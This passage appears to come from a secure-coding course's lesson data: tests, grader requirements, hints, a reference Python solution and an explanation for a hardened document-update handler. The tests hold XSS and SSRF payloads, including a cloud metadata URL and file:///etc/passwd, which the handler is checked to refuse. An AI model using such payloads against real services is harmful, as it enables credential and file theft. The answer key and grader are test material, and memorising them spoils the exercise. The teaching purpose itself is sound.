user = {"id": 7, "role": "member"}
for bad in ({}, {"id": "1"}, {"id": 1.0}, {"id": True}, [1], None, "x"):
    with raises(ValueError):
        handle_update(store, user, bad)`,
          },
          {
            name: "output is escaped",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = handle_update(store, {"id": 7, "role": "member"},
                    {"id": 1, "title": "<script>alert(1)</script>"})
assert "<script>" not in got["html"], f"got {got['html']!r}"
assert "&lt;script&gt;" in got["html"], f"got {got['html']!r}"`,
          },
          {
            name: "ssrf is refused and nothing is fetched",
            code: `WORLD.reset()
store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
for bad in ("http://169.254.169.254/latest/meta-data/",
            "https://169.254.169.254/latest/meta-data/",
            "http://localhost:9200/_cluster/health",
            "https://mitm.example.com/x",
            "file:///etc/passwd"):
    try:
        handle_update(store, user, {"id": 1, "callback": bad})
        raise AssertionError(f"{bad!r} should have been refused")
    except ValueError as e:
        assert "callback" in str(e), f"got {str(e)!r}"
assert not WORLD.breached, f"a breach occurred: {WORLD.report()}"`,
          },
          {
            name: "an allowlisted callback is fetched",
            code: `WORLD.reset()
store = {k: dict(v) for k, v in DOCS.items()}
got = handle_update(store, {"id": 7, "role": "member"},
                    {"id": 1, "callback": "https://status.example.com/"})
assert got["preview"] == {"status": "ok", "region": "emea"}, f"got {got['preview']!r}"
assert not WORLD.breached`,
          },
          {
            name: "a failed callback degrades instead of failing the update",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = handle_update(store, {"id": 7, "role": "member"},
                    {"id": 1, "title": "kept", "callback": "https://api.example.com/v1/nothing"})
assert got["preview"] is None, f"got {got['preview']!r}"
assert store[1]["title"] == "kept", "the update should still have been applied"`,
          },
          {
            name: "internal fields never appear",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = handle_update(store, {"id": 7, "role": "member"}, {"id": 1, "title": "x"})
blob = str(got)
for leak in ("internal_note", "owner_id", "do not share"):
    assert leak not in blob, f"{leak!r} leaked: {blob!r}"`,
          },
        ],
        requirements: [
          { kind: "defines", value: "handle_update" },
          { kind: "no_finding", value: "PY-TLS-VERIFY-OFF" },
          { kind: "no_finding", value: "PY-NO-TIMEOUT" },
          { kind: "no_finding", value: "PY-SSRF" },
          { kind: "no_finding", value: "PY-XSS-MARKUP" },
          { kind: "forbids", value: "verify\\s*=\\s*False", message: "Certificate verification stays on." },
        ],
        hints: [
          "Follow the five-step shape literally: a block for each of authenticate, validate, authorise, act, render. Each block either raises or produces a local variable for the next.",
          "Unknown-key validation comes before the ownership check, so a probe with a bad field gets a precise error rather than revealing whether the document exists.",
          "For the callback, reuse the previous lesson's validator shape: parse, require `https`, require an allowlisted hostname, then fetch with `timeout=(3.05, 10), allow_redirects=False`.",
          "Catch only `requests.RequestException` (and your own `ValueError` from a status check) around the fetch, and set `preview = None`. A broken callback must not roll back a successful update.",
        ],
        solution: `import requests
from urllib.parse import urlparse

from miniweb import escape

PUBLIC_FIELDS = ("id", "title", "body")
ACCEPTED_KEYS = ("id", "title", "body", "callback")
WRITABLE = ("title", "body")
LIMITS = {"title": 80, "body": 1000}
ALLOWED_HOSTS = frozenset({"api.example.com", "status.example.com"})

DOCS = {
    1: {"id": 1, "owner_id": 7, "title": "Q4", "body": "revenue up", "internal_note": "do not share"},
    3: {"id": 3, "owner_id": 9, "title": "merger", "body": "confidential", "internal_note": "legal only"},
}


def public_view(doc):
    return {field: doc[field] for field in PUBLIC_FIELDS if field in doc}


def _validate_callback(raw):
    """Return a URL we are willing to fetch, or raise."""
    if not isinstance(raw, str) or not raw or len(raw) > 2000:
        raise ValueError("callback not permitted")

    parts = urlparse(raw)
    if parts.scheme != "https" or "@" in parts.netloc:
        raise ValueError("callback not permitted")
    if parts.port not in (None, 443):
        raise ValueError("callback not permitted")
    if (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        raise ValueError("callback not permitted")
    return raw


def _fetch_preview(url):
    """Best effort: a failed callback must not fail the update."""
    try:
        response = requests.get(url, timeout=(3.05, 10), allow_redirects=False)
        if response.status_code >= 400:
            return None
        return response.json()
    except requests.RequestException:
        return None
    except ValueError:
        return None


def handle_update(store, user, body):
    """Authenticate, validate, authorise, act, fetch, render."""
    # 1. authenticate
    if not user:
        raise PermissionError("login required")

    # 2. validate
    if not isinstance(body, dict):
        raise ValueError("malformed request")

    unknown = set(body) - set(ACCEPTED_KEYS)
    if unknown:
        raise ValueError(f"not writable: {sorted(unknown)}")

    doc_id = body.get("id")
    if isinstance(doc_id, bool) or not isinstance(doc_id, int):
        raise ValueError("malformed request")

    updates = {}
    for field in WRITABLE:
        if field in body:
            value = body[field]
            if not isinstance(value, str):
                raise ValueError("malformed request")
            updates[field] = value[:LIMITS[field]]

    callback = _validate_callback(body["callback"]) if "callback" in body else None

    # 3. authorise
    doc = store.get(doc_id)
    if doc is None:
        raise LookupError("not found")
    if user.get("role") != "admin" and doc.get("owner_id") != user.get("id"):
        raise LookupError("not found")

    # 4. act
    doc.update(updates)

    # 5. fetch (best effort) and render
    preview = _fetch_preview(callback) if callback else None

    return {
        "doc": public_view(doc),
        "html": f"<h1>{escape(doc['title'])}</h1>",
        "preview": preview,
    }


print(handle_update(DOCS, {"id": 7, "role": "member"}, {"id": 1, "title": "Q4 final"})["html"])`,
        why: `The handler reads as five labelled blocks, and the order of those blocks is the security property. Every check and every rejection happens before \`doc.update(updates)\`; by the time anything mutates, the request has been proven well-formed, the fields have been proven writable, and the object has been proven to belong to this user.

Each original vulnerability is closed by a different mechanism, and it is worth naming which:

- **IDOR** — the ownership comparison, with the *same* \`LookupError("not found")\` for missing and unowned. Different errors would restore the enumeration oracle even with the access control in place.
- **Mass assignment** — \`set(body) - set(ACCEPTED_KEYS)\` rejects unknown keys by name, and \`WRITABLE\` controls what is actually applied. Two separate lists, because \`id\` and \`callback\` are *accepted* inputs that are not *writable* fields.
- **XSS** — \`escape()\` at the point of rendering, not on the stored value. The document keeps the title the user typed; only the HTML view is encoded.
- **SSRF** — scheme, userinfo, port and host are each checked separately on the parsed URL. Note that \`_validate_callback\` runs during validation, before authorisation: a hostile callback is refused even for a document the attacker does own.
- **TLS and timeouts** — \`verify\` is never mentioned, so it stays \`True\`, and the timeout is explicit. \`allow_redirects=False\` keeps the host allowlist meaningful.
- **Excessive exposure** — \`public_view\` builds the response from a tuple, so \`internal_note\` and \`owner_id\` cannot appear, now or after someone adds a field to the store.

One deliberate asymmetry: a **rejected** callback raises and fails the whole request, while a **failed** callback returns \`None\` and the update still applies. The first is the client sending something it was never allowed to send; the second is an upstream having a bad day. Collapsing those two into one behaviour would either let a hostile URL pass quietly or let a flaky third party block your users from editing their own documents.`,
      },
      wrapup: `- Authenticate → validate → authorise → act → render. Everything before the mutation.
- Each vulnerability class needs its own mechanism; none of them substitutes for another.
- Distinguish "you may not send this" from "the upstream failed".
- Write the attack as a test, so the fix cannot silently regress.`,
      refs: [
        { label: "OWASP API Security Top 10 (2023)", url: "https://owasp.org/API-Security/editions/2023/en/0x11-t10/" },
        { label: "OWASP Top Ten", url: "https://owasp.org/www-project-top-ten/" },
      ],
    },
  ],
};
